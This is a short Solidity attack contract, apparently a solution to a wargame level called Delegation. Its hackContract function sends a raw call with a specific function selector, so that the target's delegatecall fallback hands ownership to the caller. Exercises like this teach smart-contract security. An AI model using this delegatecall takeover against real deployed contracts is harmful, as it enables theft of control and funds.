// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        address(Delegation(contractAddress)).call(
            abi.encodeWithSelector(0xdd365b8b)
        );
    }
}
